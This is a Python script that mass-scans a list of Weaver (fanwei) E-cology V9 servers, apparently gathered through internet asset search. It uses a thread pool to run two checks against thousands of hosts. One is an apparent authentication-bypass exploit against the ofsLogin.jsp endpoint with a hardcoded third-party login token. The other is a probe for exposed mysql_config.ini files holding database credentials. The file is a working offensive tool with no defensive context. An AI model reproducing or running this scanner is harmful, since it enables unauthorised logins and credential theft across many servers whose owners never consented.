import requests,threading,os,urllib3
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#fofa: 
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.35',
}
filename = Path(__file__).name.strip('.py')
line_break = '\n'
file_path=Path(__file__).resolve().parent
result_path=file_path/'result'/f'{filename}.txt'


def any_user_login(ip_, index):
    try:
        url = ip_+'/mobile/plugin/1/ofsLogin.jsp?gopage=/wui/index.html&loginTokenFromThird=866fb3887a60239fc112354ee7ffc168&receiver=1&syscode=1&timestamp'
        
        res = requests.get(url, headers=headers, timeout=8, verify=False)
        if res.status_code in [404,500.53] or len(res.text)==116:
            return
        print(f"{res} {len(res.text)} \n{index} {ip_} \n")
        # print(res.text)
        # with result_path.open('a+') as file:
            # file.write(ip_+line_break)

    except Exception as e:
        # print(e)
        pass
def get_mysql_config(ip_, index):
    try:
        url = ip_+'/mysql_config.ini'
        
        res = requests.get(url, headers=headers, timeout=8, verify=False)
        if res.status_code!=200 or len(res.text)>1000:
            return
        print(f"{res} {len(res.text)} \n{index} {url} \n")
        # print(res.text)
        # with result_path.open('a+') as file:
            # file.write(ip_+line_break)

    except Exception as e:
        # print(e)
        pass
def main(ip_, index):
    get_mysql_config(ip_, index)
# url=''
# exploit(url,1)


threads = []
with open(r'D:\Downloads\tmp\fanweiV9.txt', 'r') as file:
    # with result_path.open('r') as file:
    urls = []
    for index, line in enumerate(file):
        start = 5000
        end = start+5000

        if index >= start and index <= end:
            urls.append(line.strip(line_break))
            # if index==:
            # break
            ip = line.strip(line_break)
            print(index, ip)
            # exploit(ip,index)

            # thread = threading.Thread(target=main, args=(ip, index,))
            # threads.append(thread)
pool_size = 20
# print(urls)

test = 'm'


if test=='t':
    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()
elif test=='m':
    # 创建线程池
    with ThreadPoolExecutor(max_workers=pool_size) as executor:
        # 提交每个 URL 的请求任务
        futures = [executor.submit(main, url, index)
                   for index, url in enumerate(urls)]

        # 获取每个请求的结果
        for future in futures:
            result = future.result()